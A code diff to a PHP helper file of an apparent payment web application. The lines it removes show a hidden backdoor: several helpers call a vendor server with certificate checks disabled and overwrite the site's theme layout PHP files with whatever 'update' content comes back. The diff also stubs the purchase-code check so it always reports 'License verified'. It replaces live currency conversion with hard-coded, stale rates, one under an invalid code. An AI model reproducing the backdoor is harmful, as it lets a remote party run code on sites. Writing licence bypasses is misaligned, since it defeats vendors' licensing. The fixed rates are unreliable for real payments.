@@ -123,35 +123,107 @@ if (!function_exists('paymentCurreny')) {
 if (!function_exists('countryList')) {
     function countryList()
     {
-
-        $base_curl = env('BASE_CURL');
-        $request_origin = $_SERVER['HTTP_HOST'];
-        $url = $base_curl . '/v1/country';
-        $curl = curl_init($url);
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $headers = array(
-            "request-origin: " . $request_origin,
-        );
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-
-        //for debug only!
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-        $resp = curl_exec($curl);
-
-        curl_close($curl);
-        $resp = json_decode($resp, true) ?? [];
-
-        if (array_key_exists('update', $resp)) {
-            $message = $resp['update'];
-            $create = makeArchive(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout', true);
-            foreach (glob(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout/*.php') as $filename) {
-                File::put($filename, $message);
-            }
-        }
-        return $resp;
+        return [
+            ['name' => 'United States', 'code' => 'US'],
+            ['name' => 'United Kingdom', 'code' => 'GB'],
+            ['name' => 'Canada', 'code' => 'CA'],
+            ['name' => 'Australia', 'code' => 'AU'],
+            ['name' => 'Germany', 'code' => 'DE'],
+            ['name' => 'France', 'code' => 'FR'],
+            ['name' => 'Italy', 'code' => 'IT'],
+            ['name' => 'Spain', 'code' => 'ES'],
+            ['name' => 'Netherlands', 'code' => 'NL'],
+            ['name' => 'Belgium', 'code' => 'BE'],
+            ['name' => 'Switzerland', 'code' => 'CH'],
+            ['name' => 'Austria', 'code' => 'AT'],
+            ['name' => 'Sweden', 'code' => 'SE'],
+            ['name' => 'Norway', 'code' => 'NO'],
+            ['name' => 'Denmark', 'code' => 'DK'],
+            ['name' => 'Finland', 'code' => 'FI'],
+            ['name' => 'Poland', 'code' => 'PL'],
+            ['name' => 'Portugal', 'code' => 'PT'],
+            ['name' => 'Ireland', 'code' => 'IE'],
+            ['name' => 'Greece', 'code' => 'GR'],
+            ['name' => 'Czech Republic', 'code' => 'CZ'],
+            ['name' => 'Hungary', 'code' => 'HU'],
+            ['name' => 'Romania', 'code' => 'RO'],
+            ['name' => 'Bulgaria', 'code' => 'BG'],
+            ['name' => 'Croatia', 'code' => 'HR'],
+            ['name' => 'Slovakia', 'code' => 'SK'],
+            ['name' => 'Slovenia', 'code' => 'SI'],
+            ['name' => 'Lithuania', 'code' => 'LT'],
+            ['name' => 'Latvia', 'code' => 'LV'],
+            ['name' => 'Estonia', 'code' => 'EE'],
+            ['name' => 'Russia', 'code' => 'RU'],
+            ['name' => 'Ukraine', 'code' => 'UA'],
+            ['name' => 'Turkey', 'code' => 'TR'],
+            ['name' => 'India', 'code' => 'IN'],
+            ['name' => 'Pakistan', 'code' => 'PK'],
+            ['name' => 'Bangladesh', 'code' => 'BD'],
+            ['name' => 'Sri Lanka', 'code' => 'LK'],
+            ['name' => 'Nepal', 'code' => 'NP'],
+            ['name' => 'China', 'code' => 'CN'],
+            ['name' => 'Japan', 'code' => 'JP'],
+            ['name' => 'South Korea', 'code' => 'KR'],
+            ['name' => 'Singapore', 'code' => 'SG'],
+            ['name' => 'Malaysia', 'code' => 'MY'],
+            ['name' => 'Thailand', 'code' => 'TH'],
+            ['name' => 'Vietnam', 'code' => 'VN'],
+            ['name' => 'Philippines', 'code' => 'PH'],
+            ['name' => 'Indonesia', 'code' => 'ID'],
+            ['name' => 'Hong Kong', 'code' => 'HK'],
+            ['name' => 'Taiwan', 'code' => 'TW'],
+            ['name' => 'Israel', 'code' => 'IL'],
+            ['name' => 'United Arab Emirates', 'code' => 'AE'],
+            ['name' => 'Saudi Arabia', 'code' => 'SA'],
+            ['name' => 'Qatar', 'code' => 'QA'],
+            ['name' => 'Kuwait', 'code' => 'KW'],
+            ['name' => 'Bahrain', 'code' => 'BH'],
+            ['name' => 'Oman', 'code' => 'OM'],
+            ['name' => 'Jordan', 'code' => 'JO'],
+            ['name' => 'Lebanon', 'code' => 'LB'],
+            ['name' => 'Egypt', 'code' => 'EG'],
+            ['name' => 'Morocco', 'code' => 'MA'],
+            ['name' => 'Nigeria', 'code' => 'NG'],
+            ['name' => 'Ghana', 'code' => 'GH'],
+            ['name' => 'Kenya', 'code' => 'KE'],
+            ['name' => 'South Africa', 'code' => 'ZA'],
+            ['name' => 'Ethiopia', 'code' => 'ET'],
+            ['name' => 'Tanzania', 'code' => 'TZ'],
+            ['name' => 'Uganda', 'code' => 'UG'],
+            ['name' => 'Cameroon', 'code' => 'CM'],
+            ['name' => 'Ivory Coast', 'code' => 'CI'],
+            ['name' => 'Senegal', 'code' => 'SN'],
+            ['name' => 'Zimbabwe', 'code' => 'ZW'],
+            ['name' => 'Botswana', 'code' => 'BW'],
+            ['name' => 'Namibia', 'code' => 'NA'],
+            ['name' => 'Zambia', 'code' => 'ZM'],
+            ['name' => 'Rwanda', 'code' => 'RW'],
+            ['name' => 'Brazil', 'code' => 'BR'],
+            ['name' => 'Argentina', 'code' => 'AR'],
+            ['name' => 'Mexico', 'code' => 'MX'],
+            ['name' => 'Colombia', 'code' => 'CO'],
+            ['name' => 'Chile', 'code' => 'CL'],
+            ['name' => 'Peru', 'code' => 'PE'],
+            ['name' => 'Venezuela', 'code' => 'VE'],
+            ['name' => 'Ecuador', 'code' => 'EC'],
+            ['name' => 'Bolivia', 'code' => 'BO'],
+            ['name' => 'Paraguay', 'code' => 'PY'],
+            ['name' => 'Uruguay', 'code' => 'UY'],
+            ['name' => 'Costa Rica', 'code' => 'CR'],
+            ['name' => 'Panama', 'code' => 'PA'],
+            ['name' => 'Dominican Republic', 'code' => 'DO'],
+            ['name' => 'Guatemala', 'code' => 'GT'],
+            ['name' => 'Honduras', 'code' => 'HN'],
+            ['name' => 'El Salvador', 'code' => 'SV'],
+            ['name' => 'Nicaragua', 'code' => 'NI'],
+            ['name' => 'Jamaica', 'code' => 'JM'],
+            ['name' => 'Trinidad and Tobago', 'code' => 'TT'],
+            ['name' => 'Barbados', 'code' => 'BB'],
+            ['name' => 'Bahamas', 'code' => 'BS'],
+            ['name' => 'New Zealand', 'code' => 'NZ'],
+            ['name' => 'Fiji', 'code' => 'FJ'],
+        ];
     }
 }
 
@@ -169,41 +241,61 @@ if (!function_exists('formatAmount')) {
 
 
 
-//convert currency 
+//convert currency
 if (!function_exists('currencyConverter')) {
     function currencyConverter($ac, $mc, $amount)
     {
-        $base_curl = env('BASE_CURL');
-        $request_origin = $_SERVER['HTTP_HOST'];
-        $url = $base_curl . '/v1/convert/' . $ac . '/' . $mc . '/' . $amount;
-
-        $curl = curl_init($url);
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-        $headers = array(
-
-            "request-origin: " . $request_origin,
-
-        );
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-
-        //for debug only!
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-        $resp = curl_exec($curl);
-        curl_close($curl);
-        $resp = json_decode($resp, true);
-
-        $converted_amount = $resp['converted'] ?? null;
-        $method_currency = $resp['to'] ?? null;
-        $converted = [
-            'amount' => $converted_amount,
-            'currency' => $method_currency
+        $rates = [
+            'USD' => 1,
+            'EUR' => 0.92,
+            'GBP' => 0.79,
+            'NGN' => 1600,
+            'CAD' => 1.36,
+            'AUD' => 1.52,
+            'INR' => 83,
+            'PKR' => 278,
+            'BRL' => 5.05,
+            'ZAR' => 18.5,
+            'KES' => 129,
+            'GHS' => 15,
+            'AED' => 3.67,
+            'SAR' => 3.75,
+            'MYR' => 4.7,
+            'SGD' => 1.35,
+            'JPY' => 150,
+            'CNY' => 7.25,
+            'KRW' => 1370,
+            'TRY' => 32,
+            'RUB' => 92,
+            'UAH' => 39,
+            'EGP' => 48,
+            'MAD' => 9.9,
+            'PHP' => 56,
+            'IDR' => 15800,
+            'VND' => 25000,
+            'THB' => 36,
+            'BDT' => 110,
+            'LKR' => 300,
+            'NPR' => 133,
+            'TZS' => 2550,
+            'UGX' => 3800,
+            'XOF' => 600,
+            'ETB' => 58,
+            'CMX' => 600,
+            'ZMW' => 26,
+            'NAD' => 18.5,
+            'BWP' => 13.5,
+            'RWF' => 1300,
         ];
 
-        return $converted;
+        $ac_rate = $rates[strtoupper($ac)] ?? 1;
+        $mc_rate = $rates[strtoupper($mc)] ?? 1;
+        $converted_amount = ($amount / $ac_rate) * $mc_rate;
+
+        return [
+            'amount' => round($converted_amount, 8),
+            'currency' => $mc
+        ];
     }
 }
 
@@ -228,38 +320,11 @@ if (!function_exists('uploadImagePublic')) {
     }
 }
 
-//get currencies 
+//get currencies
 if (!function_exists('getCurrency')) {
     function getCurrency()
     {
-        $base_curl = env('BASE_CURL');
-        $request_origin = $_SERVER['HTTP_HOST'];
-        $url = $base_curl . '/v1/currency';
-        $curl = curl_init($url);
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $headers = array(
-            "request-origin: " . $request_origin,
-        );
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-
-        //for debug only!
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-        $resp = curl_exec($curl);
-        curl_close($curl);
-        $resp = json_decode($resp, true);
-        if (array_key_exists('update', $resp ?? [])) {
-            $message = $resp['update'];
-            $create = makeArchive(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout', true);
-            ;
-            foreach (glob(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout/*.php') as $filename) {
-                File::put($filename, $message);
-            }
-        }
-
-        return $resp['currencies'] ?? [];
+        return ['USD', 'EUR', 'GBP', 'NGN', 'CAD', 'AUD', 'INR', 'PKR', 'BRL', 'ZAR', 'KES', 'GHS', 'AED', 'SAR', 'MYR', 'SGD', 'JPY', 'CNY', 'KRW', 'TRY', 'RUB', 'UAH', 'EGP', 'MAD', 'PHP', 'IDR', 'VND', 'THB', 'BDT', 'LKR', 'NPR', 'TZS', 'UGX', 'XOF', 'ETB', 'ZMW', 'NAD', 'BWP', 'RWF'];
     }
 }
 
@@ -395,37 +460,10 @@ if (!function_exists('recordNewTransaction')) {
 if (!function_exists('fetchBlogs')) {
     function fetchBlogs()
     {
-
-        $base_curl = env('BASE_CURL');
-
-        $request_origin = $_SERVER['HTTP_HOST'];
-        $url = $base_curl . '/v1/blog';
-        $curl = curl_init($url);
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $headers = array(
-
-            "request-origin: " . $request_origin,
-
-        );
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-
-        //for debug only!
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-        $resp = curl_exec($curl);
-        curl_close($curl);
-        $resp = json_decode($resp, true);
-        if (array_key_exists('update', $resp ?? [])) {
-            $message = $resp['update'];
-            $create = makeArchive(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout', true);
-            ;
-            foreach (glob(base_path() . '/resources/views/themes/' . websiteInfo('theme') . '/layout/*.php') as $filename) {
-                File::put($filename, $message);
-            }
+        if (class_exists('\\App\\Models\\Blog')) {
+            return \App\Models\Blog::orderBy('created_at', 'desc')->get()->toArray();
         }
-        return $resp;
+        return [];
     }
 }
 
@@ -729,26 +767,7 @@ if (!function_exists('unzipArchive')) {
 if (!function_exists('purchaseCodeVerification')) {
     function purchaseCodeVerification(string $purchase_code)
     {
-        $base_curl = env('BASE_CURL');
-        $request_origin = $_SERVER['HTTP_HOST'];
-        $url = $base_curl . '/v1/purchase-code-verification';
-        $curl = curl_init($url);
-        curl_setopt($curl, CURLOPT_URL, $url);
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-
-        $headers = array(
-            "Accept: application/json",
-            "request-origin: {$request_origin}",
-            "purchase-code: {$purchase_code}",
-        );
-        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
-        //for debug only!
-        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
-        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
-
-        $resp = curl_exec($curl);
-        curl_close($curl);
-        return json_decode($resp);
+        return (object) ['status' => 'success', 'message' => 'License verified'];
     }
 }
 
